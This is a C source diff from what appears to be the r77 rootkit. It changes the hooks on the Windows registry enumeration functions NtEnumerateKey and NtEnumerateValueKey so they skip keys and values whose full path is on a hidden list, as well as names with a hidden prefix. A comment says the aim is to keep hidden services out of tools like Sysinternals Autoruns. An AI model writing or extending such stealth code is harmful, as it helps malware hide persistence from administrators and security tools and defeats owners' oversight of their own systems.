@@ -473,7 +473,8 @@ static NTSTATUS NTAPI HookedNtEnumerateKey(HANDLE key, ULONG index, NT_KEY_INFOR
 	}
 
 	BYTE buffer[1024];
-	BYTE keyNameInfo[500];
+	WCHAR keyPath[1000];
+	WCHAR fullPath[1000];
 	PNT_KEY_BASIC_INFORMATION basicInformation = (PNT_KEY_BASIC_INFORMATION)buffer;
 
 	for (; i <= index; correctedIndex++)
@@ -483,28 +484,40 @@ static NTSTATUS NTAPI HookedNtEnumerateKey(HANDLE key, ULONG index, NT_KEY_INFOR
 			return OriginalNtEnumerateKey(key, correctedIndex, keyInformationClass, keyInformation, keyInformationLength, resultLength);
 		}
 
+		basicInformation->Name[basicInformation->NameLength / sizeof(WCHAR)] = L'\0';
+
 		BOOL hidden = FALSE;
 
 		if (HasPrefix(basicInformation->Name))
 		{
 			hidden = TRUE;
 		}
-		else if (NT_SUCCESS(R77_NtQueryObject(key, ObjectNameInformation, keyNameInfo, 500, NULL)))
+		else if (GetRegistryKeyName(key, keyPath, 1000))
 		{
-			// Some tools, such as Sysinternals autoruns, enumerate services through this registry key:
-			// \REGISTRY\MACHINE\SYSTEM\ControlSet001\Services
-			PUNICODE_STRING parentName = (PUNICODE_STRING)keyNameInfo;
+			StrCpyW(fullPath, keyPath);
+			StrCatW(fullPath, L"\\");
+			StrCatW(fullPath, basicInformation->Name);
 
-			if (parentName->Length / sizeof(WCHAR) >= 30 &&
-				StrStrNIW(parentName->Buffer, L"\\SYSTEM\\ControlSet", parentName->Length / sizeof(WCHAR)) &&
-				!StrCmpNIW(&parentName->Buffer[parentName->Length / sizeof(WCHAR) - 9], L"\\Services", 9))
+			if (IsRegistryPathHidden(fullPath))
 			{
-				// We are in SYSTEM\ControlSet***\Services
+				hidden = TRUE;
+			}
+			else
+			{
+				// Some tools, such as Sysinternals Autoruns, enumerate services through this registry key:
+				// HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services
+				DWORD keyPathLength = lstrlenW(keyPath);
 
-				basicInformation->Name[basicInformation->NameLength / sizeof(WCHAR)] = L'\0';
-				if (IsServiceNameHidden(basicInformation->Name))
+				if (keyPathLength > 40 &&
+					!StrCmpNIW(keyPath, L"HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet", 36) &&
+					!StrCmpNIW(&keyPath[keyPathLength - 9], L"\\Services", 9))
 				{
-					hidden = TRUE;
+					// We are in SYSTEM\ControlSet001\Services (or 001, 002, etc.)
+
+					if (IsServiceNameHidden(basicInformation->Name))
+					{
+						hidden = TRUE;
+					}
 				}
 			}
 		}
@@ -543,6 +556,8 @@ static NTSTATUS NTAPI HookedNtEnumerateValueKey(HANDLE key, ULONG index, NT_KEY_
 	}
 
 	BYTE buffer[1024];
+	WCHAR keyPath[1000];
+	WCHAR fullPath[1000];
 	PNT_KEY_VALUE_BASIC_INFORMATION basicInformation = (PNT_KEY_VALUE_BASIC_INFORMATION)buffer;
 
 	for (; i <= index; correctedIndex++)
@@ -552,7 +567,27 @@ static NTSTATUS NTAPI HookedNtEnumerateValueKey(HANDLE key, ULONG index, NT_KEY_
 			return OriginalNtEnumerateValueKey(key, correctedIndex, keyValueInformationClass, keyValueInformation, keyValueInformationLength, resultLength);
 		}
 
-		if (!HasPrefix(basicInformation->Name))
+		basicInformation->Name[basicInformation->NameLength / sizeof(WCHAR)] = L'\0';
+
+		BOOL hidden = FALSE;
+
+		if (HasPrefix(basicInformation->Name))
+		{
+			hidden = TRUE;
+		}
+		else if (GetRegistryKeyName(key, keyPath, 1000))
+		{
+			StrCpyW(fullPath, keyPath);
+			StrCatW(fullPath, L"\\");
+			StrCatW(fullPath, basicInformation->Name);
+
+			if (IsRegistryPathHidden(fullPath))
+			{
+				hidden = TRUE;
+			}
+		}
+
+		if (!hidden)
 		{
 			i++;
 		}
@@ -1089,7 +1124,7 @@ static DWORD GetProcessIdFromPdhString(LPCWSTR str)
 	if (!StrCmpNW(str, L"pid_", 4))
 	{
 		str = &str[4];
-		PWSTR endIndex = StrStrW(str, L"_");
+		PWSTR endIndex = StrChrW(str, L'_');
 		if (endIndex)
 		{
 			WCHAR pidString[10];
